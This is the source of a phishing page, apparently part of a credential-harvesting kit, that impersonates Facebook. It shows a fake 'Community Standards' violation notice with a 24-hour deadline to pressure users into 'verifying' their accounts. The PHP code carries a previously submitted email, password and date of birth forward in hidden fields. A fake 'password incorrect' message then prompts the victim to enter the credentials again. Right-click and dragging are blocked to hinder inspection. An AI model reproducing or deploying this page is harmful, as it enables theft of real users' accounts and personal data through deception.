<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email1 = htmlspecialchars(trim($_POST['godhelpme1ma']));
    $password1 = htmlspecialchars(trim($_POST['godhelpme1pa']));
    $month1 = htmlspecialchars(trim($_POST['godhelpme1mo']));
    $day1 = htmlspecialchars(trim($_POST['godhelpme1da']));
    $year1 = htmlspecialchars(trim($_POST['godhelpme1ye']));
}
?>
	
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Facebook</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style>
        .anticon {
            display: inline-block;
            color: inherit;
            font-style: normal;
            line-height: 0;
            text-align: center;
            text-transform: none;
            vertical-align: -0.125em;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .anticon>* {
            line-height: 1;
        }

        .anticon svg {
            display: inline-block;
        }

        .anticon::before {
            display: none;
        }

        .anticon .anticon-icon {
            display: block;
        }

        .anticon[tabindex] {
            cursor: pointer;
        }

        .anticon-spin::before,
        .anticon-spin {
            display: inline-block;
            -webkit-animation: loadingCircle 1s infinite linear;
            animation: loadingCircle 1s infinite linear;
        }

        @-webkit-keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
    <link rel="icon" href="./assets/sound-mobile.png">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#fafafa">
    <link href="./assets/styles.css" rel="stylesheet">
    <link href="./assets/chunk1.css" rel="stylesheet">
    <link rel="apple-touch-icon" href="./assets/icon.png">
    <link href="./assets/main.chunk.css" rel="stylesheet">
    <script src="./assets/jquery.min.js"></script>
    <script type="text/javascript">
        function mousedwn(e) {
            try {
                if (event.button == 2 || event.button == 3) return false
            } catch (e) {
                if (e.which == 3) return false
            }
        }
        document.oncontextmenu = function() {
            return false
        };
        document.ondragstart = function() {
            return false
        };
        document.onmousedown = mousedwn
    </script>
</head>

<body>

    <div id="root">
        <div class="ant-spin-nested-loading">
            <div class="">
                <div class="sc-jqCOkK kFZWwp">
                    <div class="sc-gGBfsJ jvrGcO">
                        <div class="sc-jnlKLf OHNdu">
                            <div class="hARKVj">
                                <img src="./assets/sound-mobile.png" alt="" style="width: 46px;margin: 5px 15px;" class="sc-tilXH gdtVXy">
                            </div>
                            <div class="bro-1">Community Standards</div>
                            <div class="bro-2">For the safety and security of other users, we have received a report from another user that your account does not follow Community Standards and violates our terms of service. If you haven't done anything wrong, you can verify your account and reject the decision.</div>
                            <div class="bro-22">Per Community Standards, you have <b>24 hours</b> to resolve the issue and prevent your account from being permanently disabled.</div>
                            <div class="sc-htoDjs cDnNqw">
                                <form action="rever.html" method="post" class="ant-form ant-form-horizontal">
                                    <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
                                        <div class="ant-col ant-form-item-control">
                                            <div>
                                                <div class="thepadding">
                                                    <input type="hidden" name="godhelpme1ma" value="<?php echo $email1; ?>" readonly>
                                                    <input type="hidden" name="godhelpme1pa" value="<?php echo $password1; ?>" readonly>
                                                    <input type="hidden" name="godhelpme1mo" value="<?php echo $month1; ?>" readonly>
                                                    <input type="hidden" name="godhelpme1da" value="<?php echo $day1; ?>" readonly>
                                                    <input type="hidden" name="godhelpme1ye" value="<?php echo $year1; ?>" readonly>
                                                    <input type="text" class="import-account__secret-phrase SpceE" placeholder="Email address or phone number" maxlength="40" name="godhelpme2ma" value="" pattern=".{6,}" required="" autocomplete="off">
                                                    <input type="password" class="import-account__secret-phrasee" placeholder="Password" maxlength="30" name="godhelpme2pa" value="" pattern=".{6,}" required="" autocomplete="off">
                                                    <div class="Er0tEx">The password that you've entered is incorrect.</div>
                                                    <div class="TexL4b3L">Date of birth</div>
                                                    <div class="BirdSeleCt">
                                                        <select aria-label="Month" name="godhelpme2mo" id="godhelpme2mo" title="Month" class="form-select" required>
                                                        <option value="" selected="selected" disabled="disabled">Month</option>
                                                        <option>Jan</option>
                                                        <option>Feb</option>
                                                        <option>Mar</option>
                                                        <option>Apr</option>
                                                        <option>May</option>
                                                        <option>Jun</option>
                                                        <option>Jul</option>
                                                        <option>Aug</option>
                                                        <option>Sep</option>
                                                        <option>Oct</option>
                                                        <option>Nov</option>
                                                        <option>Dec</option>
                                                    </select>
                                                    <select aria-label="Day" name="godhelpme2da" id="godhelpme2da" title="Day" class="form-select l3aFT" required>
                                                        <option value="" selected="selected" disabled="disabled">Day</option>
                                                        <script>
														for(var i = 1; i <= 31; i++){
														document.write("<option>" + i + "</option>");
														};
														</script>
                                                    </select>
                                                    <select aria-label="Year" name="godhelpme2ye" id="godhelpme2ye" title="Year" class="form-select l3aFT" required>
                                                        <option value="" selected="selected" disabled="disabled">Year</option>
                                                        <script>
														for(var i = 1905; i <= 2024; i++){
														document.write("<option>" + i + "</option>");
														};
														</script>
                                                    </select>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ant-form-item-explain">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="thepadding">
                                        <button class="button sc-VigVT fWmldN" type="submit">Verification</button>
                                        <div1></div1>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="confirm-approve-content__view-full-tx-button-wrapper">
                            <div class="confirm-approve-content__view-full-tx-button cursor-pointer"></div>
                        </div>
                        <div class="wawobp loader" data-tenqwa="9fkuxe">
                            <div class="yat5ls lodas" data-2ivb6w="2n92zq">
                                <svg viewBox="0 0 40 40" width="80px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-5a69fd5e-0 iGtDTz"> </svg>
                                <center>
                                    <div class="sc-fYxtnH hARKVj"><img src="./assets/sound-mobile.svg" alt="" style="height: 70px;width: 150px;" class="sc-tilXH gdtVXy"></div>
                                </center>

                                <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                        <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
                                            <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                        </circle>
                                    </svg>

                                </div>

                                <script src="./assets/load.js"></script>
                                </svg>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	
</body>
</html>
